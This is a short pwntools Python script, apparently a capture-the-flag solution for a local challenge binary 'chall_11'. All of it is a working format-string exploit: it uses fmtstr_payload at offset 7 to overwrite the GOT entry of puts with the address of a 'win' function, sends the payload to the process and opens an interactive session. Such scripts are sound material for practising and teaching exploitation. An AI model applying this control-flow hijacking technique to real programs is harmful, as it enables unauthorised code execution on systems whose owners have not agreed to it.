from pwn import *

elf = ELF("./chall_11")

p = process("./chall_11")

payload = fmtstr_payload(7,{elf.got.puts:elf.sym.win})

p.sendline(payload)

p.interactive()
